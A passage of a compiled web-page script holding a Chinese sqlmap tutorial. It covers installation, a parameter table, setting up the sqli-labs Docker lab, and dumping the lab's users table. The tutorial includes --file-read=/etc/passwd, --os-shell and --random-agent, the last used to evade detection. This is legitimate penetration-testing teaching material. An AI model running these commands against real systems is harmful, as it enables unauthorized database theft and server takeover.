(window.webpackJsonp=window.webpackJsonp||[]).push([[62],{425:function(a,s,e){"use strict";e.r(s);var t=e(11),r=Object(t.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h2",{attrs:{id:"关于sqlmap"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#关于sqlmap"}},[a._v("#")]),a._v(" 关于sqlmap")]),a._v(" "),s("p",[a._v("sqlmap 是一款开源渗透测试工具，可以自动检测和利用 SQL 注入漏洞，并接管数据库服务器。")]),a._v(" "),s("p",[a._v("SQLmap官方文档"),s("a",{attrs:{href:"https://github.com/sqlmapproject/sqlmap/wiki/usage",target:"_blank",rel:"noopener noreferrer"}},[a._v("SQLmap wiki"),s("OutboundLink")],1)]),a._v(" "),s("h2",{attrs:{id:"sqlmap安装"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#sqlmap安装"}},[a._v("#")]),a._v(" sqlmap安装")]),a._v(" "),s("p",[a._v("kali自带了sqlmap，直接在终端输入"),s("code",[a._v("sqlmap")]),a._v("即可使用。")]),a._v(" "),s("p",[a._v("windows可以直接下载"),s("a",{attrs:{href:"https://github.com/sqlmapproject/sqlmap/archive/refs/tags/1.9.zip",target:"_blank",rel:"noopener noreferrer"}},[a._v("sqlmap"),s("OutboundLink")],1),a._v("，解压后在终端进入sqlmap目录，输入"),s("code",[a._v("python sqlmap.py")]),a._v("，需要python环境。")]),a._v(" "),s("h2",{attrs:{id:"sqlmap常用参数"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#sqlmap常用参数"}},[a._v("#")]),a._v(" sqlmap常用参数")]),a._v(" "),s("table",[s("thead",[s("tr",[s("th",[a._v("sqlmap参数")]),a._v(" "),s("th",[a._v("作用")]),a._v(" "),s("th",[a._v("用法")])])]),a._v(" "),s("tbody",[s("tr",[s("td",[a._v("-h")]),a._v(" "),s("td",[a._v("帮助信息")]),a._v(" "),s("td",[a._v("sqlmap -h")])]),a._v(" "),s("tr",[s("td",[a._v("-u")]),a._v(" "),s("td",[a._v("指定目标URL")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/page.php?id=1"')])]),a._v(" "),s("tr",[s("td",[a._v("-r")]),a._v(" "),s("td",[a._v("从文件中读取HTTP请求")]),a._v(" "),s("td",[a._v('sqlmap -r "request.txt"')])]),a._v(" "),s("tr",[s("td",[a._v("-d")]),a._v(" "),s("td",[a._v("直接连接数据库（低版本mysql）")]),a._v(" "),s("td",[a._v('sqlmap -d "mysql://user:pass@ip/database"')])]),a._v(" "),s("tr",[s("td",[a._v("-D")]),a._v(" "),s("td",[a._v("指定数据库名")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" -D dbname')])]),a._v(" "),s("tr",[s("td",[a._v("-T")]),a._v(" "),s("td",[a._v("指定表名")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" -D dbname -T tablename')])]),a._v(" "),s("tr",[s("td",[a._v("-C")]),a._v(" "),s("td",[a._v("指定列名")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" -D dbname -T tablename -C columnname')])]),a._v(" "),s("tr",[s("td",[a._v("-p")]),a._v(" "),s("td",[a._v("指定测试参数")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1&page=2" -p id')])]),a._v(" "),s("tr",[s("td",[a._v("-v")]),a._v(" "),s("td",[a._v("设置详细级别(0-6)")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" -v 3')])]),a._v(" "),s("tr",[s("td",[a._v("--dbms")]),a._v(" "),s("td",[a._v("指定数据库类型")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" --dbms=mysql')])]),a._v(" "),s("tr",[s("td",[a._v("--dbs")]),a._v(" "),s("td",[a._v("枚举所有数据库")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" --dbs')])]),a._v(" "),s("tr",[s("td",[a._v("--current-db")]),a._v(" "),s("td",[a._v("获取当前数据库名")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" --current-db')])]),a._v(" "),s("tr",[s("td",[a._v("--tables")]),a._v(" "),s("td",[a._v("枚举数据库中的表")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" -D dbname --tables')])]),a._v(" "),s("tr",[s("td",[a._v("--columns")]),a._v(" "),s("td",[a._v("枚举表中的列")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" -D dbname -T tablename --columns')])]),a._v(" "),s("tr",[s("td",[a._v("--dump")]),a._v(" "),s("td",[a._v("导出表中数据")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" -D dbname -T tablename --dump')])]),a._v(" "),s("tr",[s("td",[a._v("--cookie")]),a._v(" "),s("td",[a._v("指定cookie值")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/" --cookie="PHPSESSID=value"')])]),a._v(" "),s("tr",[s("td",[a._v("--data")]),a._v(" "),s("td",[a._v("POST数据")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/login.php" --data="user=admin&pass=admin"')])]),a._v(" "),s("tr",[s("td",[a._v("--level")]),a._v(" "),s("td",[a._v("设置检测级别(1-5)")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" --level=3')])]),a._v(" "),s("tr",[s("td",[a._v("--risk")]),a._v(" "),s("td",[a._v("设置风险级别(1-3)")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" --risk=2')])]),a._v(" "),s("tr",[s("td",[a._v("--batch")]),a._v(" "),s("td",[a._v("自动化探测，交互过程使用默认参数")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" --batch')])]),a._v(" "),s("tr",[s("td",[a._v("--flush-session")]),a._v(" "),s("td",[a._v("刷新会话数据")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" --flush-session')])]),a._v(" "),s("tr",[s("td",[a._v("--random-agent")]),a._v(" "),s("td",[a._v("随机User-Agent")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" --random-agent')])]),a._v(" "),s("tr",[s("td",[a._v("--technique")]),a._v(" "),s("td",[a._v("指定SQL注入技术")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" --technique=BEU')])]),a._v(" "),s("tr",[s("td",[a._v("--hex")]),a._v(" "),s("td",[a._v("使用十六进制编码")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" --hex')])]),a._v(" "),s("tr",[s("td",[a._v("--file-read")]),a._v(" "),s("td",[a._v("读取服务器文件")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" --file-read=/etc/passwd')])]),a._v(" "),s("tr",[s("td",[a._v("--os-shell")]),a._v(" "),s("td",[a._v("获取交互式系统shell")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" --os-shell')])]),a._v(" "),s("tr",[s("td",[a._v("--sql-shell")]),a._v(" "),s("td",[a._v("获取交互式SQL shell")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" --sql-shell')])]),a._v(" "),s("tr",[s("td",[a._v("--time-sec")]),a._v(" "),s("td",[a._v("设置延时注入时间")]),a._v(" "),s("td",[a._v('sqlmap -u "http://example.com/?id=1" --technique=T --time-sec=10')])])])]),a._v(" "),s("p",[a._v("一般是单字参数使用"),s("code",[a._v("-")]),a._v("，多字符参数使用"),s("code",[a._v("--")])]),a._v(" "),s("h2",{attrs:{id:"靶场环境部署"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#靶场环境部署"}},[a._v("#")]),a._v(" 靶场环境部署")]),a._v(" "),s("p",[a._v("使用docker部署一个sqli-labs靶场环境。")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("docker")]),a._v(" pull acgpiano/sqli-labs\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("docker")]),a._v(" run "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-dt")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--name")]),a._v(" sqli-lab "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("8080")]),a._v(":80 acgpiano/sqli-labs:latest\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br")])]),s("p",[a._v("访问 http://ip:8080/ 即可进入靶场。")]),a._v(" "),s("h2",{attrs:{id:"sqlmap使用"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#sqlmap使用"}},[a._v("#")]),a._v(" sqlmap使用")]),a._v(" "),s("p",[a._v("开始前的建议：建议先尝试手注完成"),s("code",[a._v("sqli-labs")]),a._v("整个靶场，掌握基本的手注原理")]),a._v(" "),s("h3",{attrs:{id:"u-p-v-batch"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#u-p-v-batch"}},[a._v("#")]),a._v(" -u,-p,-v,--batch")]),a._v(" "),s("p",[a._v("进入less-1，这是一个GET请求方式的单引号类型sql注入点")]),a._v(" "),s("pre",[a._v("-u     指定目标URL\n-p     指定测试参数，如果待测试参数为get类型，且出现在-u的url中时，-p可以省略\n-v     设置日志级别(0-6)，默认使用-v 1，可以省略\n--batch  自动化探测，交互过程使用默认参数\n")]),a._v(" "),s("p",[a._v("先尝试手注，发现是单引号类型，猜测后台语句")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/sqlmap/1.png",alt:"1"}})]),a._v(" "),s("div",{staticClass:"language-sql line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-sql"}},[s("code",[a._v("$"),s("span",{pre:!0,attrs:{class:"token keyword"}},[a._v("sql")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("\"SELECT * FROM users WHERE id = '$_GET[id]'\"")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(";")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("使用sqlmap进行测试")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("sqlmap执行过程会出现交互过程，供用户选择参数，可以执行回车，使用默认参数")]),a._v(" "),s("p",[a._v("过程的交互提示类似：")]),a._v(" "),s("div",{staticClass:"language-plaintext line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plaintext"}},[s("code",[a._v("# 检测到后台是mysql，是否跳过其他类型数据库的测试\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]\n# 是否跳过其他类型的注入测试\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]\n# 检测到GET参数'id'存在注入漏洞，是否跳过测试其他参数\n# 也是关键提示，提示是否检测到当前参数存在sql注入漏洞\nGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br")])]),s("p",[a._v("你也可以使用"),s("code",[a._v("--batch")]),a._v("参数，跳过交互过程，过程会全部使用默认参数。")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("sqlmap的结尾有这样的内容，意思是，这个注入点可以使用"),s("code",[a._v("联合注入，报错注入，时间盲注，布尔盲注")]),a._v("四种方式")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/sqlmap/2.png",alt:"2"}})]),a._v(" "),s("p",[a._v("同时，末尾还给出了探测到的信息")]),a._v(" "),s("div",{staticClass:"language-plaintext line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plaintext"}},[s("code",[a._v("[13:39:34] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: PHP 5.5.9, Apache 2.4.7\nback-end DBMS: MySQL >= 5.5\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br")])]),s("p",[a._v("在上面的命令中，会识别使用默认的参数"),s("code",[a._v("-p id")]),a._v("、"),s("code",[a._v("-v 1")]),a._v("，所以上面命令也等效于下面这个")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("id")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-v")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("1")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("div",{staticClass:"custom-block tip"},[s("p",{staticClass:"custom-block-title"},[a._v("小细节")]),a._v(" "),s("p",[a._v("sqlmap的特征？SQLmap在进行http请求时，UA头使用了"),s("code",[a._v("User-Agent: sqlmap/1.9.3.2#dev (https://sqlmap.org)")])])]),a._v(" "),s("h3",{attrs:{id:"v-flush-session-random-agent"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#v-flush-session-random-agent"}},[a._v("#")]),a._v(" -v,--flush-session,--random-agent")]),a._v(" "),s("p",[a._v("觉得"),s("code",[a._v("-v")]),a._v("参数可以单独拿出来说说")]),a._v(" "),s("pre",[a._v("0：仅显示 Python 回溯、错误和关键消息。\n1：同时显示信息和警告消息，默认级别。\n2：显示DEBUG 调试消息。\n3：显示注入的payload。\n4：显示详细 HTTP 请求。\n5：显示 HTTP 响应的标头。\n6：显示服务器 HTTP 响应的页面内容。\n")]),a._v(" "),s("p",[a._v("这里讲讲"),s("code",[a._v("-v")]),a._v("、"),s("code",[a._v("--flush-session")]),a._v("和"),s("code",[a._v("--random-agent")]),a._v("的使用")]),a._v(" "),s("pre",[a._v("-v n   其中-v 2可以表示为-vv\n--flush-session  刷新会话数据，清除之前的会话数据\n--random-agent  随机User-Agent\n")]),a._v(" "),s("p",[a._v("由于上面已经对"),s("code",[a._v("less-1")]),a._v("进行了测试，sqlmap会有缓存文件，再测试这个站点时，会直接使用测试过的环境，这里为了验证这些参的作用，就先清除缓存")]),a._v(" "),s("p",[a._v("在"),s("code",[a._v("-v")]),a._v("参数使用2级时，可以看到sqlmap测试时的细节，跳过了其他类型的数据库")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("id")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-vv")]),a._v(" --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/sqlmap/3.png",alt:"3"}})]),a._v(" "),s("p",[a._v("在"),s("code",[a._v("-v")]),a._v("参数使用3级时，可以看到sqlmap测试过程使用的payload")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("id")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-v")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("3")]),a._v(" --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/sqlmap/4.png",alt:"4"}})]),a._v(" "),s("p",[a._v("在"),s("code",[a._v("-v")]),a._v("参数使用4级时，可以看到sqlmap测试过程使用的HTTP请求详细信息，其中ua头里的sqlmap字段算是特征")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("id")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-v")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("4")]),a._v(" --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/sqlmap/5.png",alt:"5"}})]),a._v(" "),s("p",[a._v("在"),s("code",[a._v("-v")]),a._v("参数使用5级时，可以看到sqlmap测试过程中，发送一个请求，返回一个响应的HTTP头信息")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("id")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-v")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("5")]),a._v(" --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/sqlmap/6.png",alt:"6"}})]),a._v(" "),s("p",[a._v("在"),s("code",[a._v("-v")]),a._v("参数使用6级时，可以看到sqlmap测试过程中，还返回了页面的内容")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("id")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-v")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("6")]),a._v(" --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/sqlmap/7.png",alt:"7"}})]),a._v(" "),s("p",[a._v("使用"),s("code",[a._v("--random-agent")]),a._v("参数，可以随机生成一个User-Agent，避免被网站识别到是sqlmap的特征，使用-v 4，可以看到请求头中随机生成的User-Agent字段")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("id")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-v")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("4")]),a._v(" --flush-session --random-agent "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/sqlmap/8.png",alt:"8"}})]),a._v(" "),s("h3",{attrs:{id:"dbs-tables-columns-dump-d-t-c"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#dbs-tables-columns-dump-d-t-c"}},[a._v("#")]),a._v(" --dbs,--tables,--columns,--dump,-D,-T,-C")]),a._v(" "),s("p",[a._v("这里的参数在上面sqlmap探测出参数存在漏洞时，就可以指定这些参数，拿到数据库数据")]),a._v(" "),s("pre",[a._v("--dbs  获取数据库列表\n--tables  获取指定数据库的表列表\n--columns  获取指定数据库指定表的列名\n--dump  获取指定数据库指定表的列数据\n-D  指定数据库\n-T  指定表\n-C  指定列\n")]),a._v(" "),s("p",[a._v("爆出所有数据库")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("id")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbs")]),a._v(" --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/sqlmap/9.png",alt:"9"}})]),a._v(" "),s("p",[a._v("使用"),s("code",[a._v("-D")]),a._v("参数指定数据库"),s("code",[a._v("security")]),a._v("，使用"),s("code",[a._v("--tables")]),a._v("参数获取表列表")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("id")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-D")]),a._v(" security "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--tables")]),a._v(" --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/sqlmap/10.png",alt:"10"}})]),a._v(" "),s("p",[a._v("使用"),s("code",[a._v("-T")]),a._v("参数指定"),s("code",[a._v("users")]),a._v("表，使用"),s("code",[a._v("--columns")]),a._v("参数获取列名")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("id")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-D")]),a._v(" security "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-T")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("users")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--columns")]),a._v(" --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/sqlmap/11.png",alt:"11"}})]),a._v(" "),s("p",[a._v("使用"),s("code",[a._v("--dump")]),a._v("，脱出指定表的数据")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("id")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-D")]),a._v(" security "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-T")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("users")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dump")]),a._v(" --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/sqlmap/12.png",alt:"12"}})]),a._v(" "),s("h3",{attrs:{id:"dbms-technique-no-cast-hex"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#dbms-technique-no-cast-hex"}},[a._v("#")]),a._v(" --dbms,--technique,--no-cast,--hex")]),a._v(" "),s("p",[a._v("在最初，尝试手注测试时，可以看到报错是mysql，同时，页面存在可控的回显位")]),a._v(" 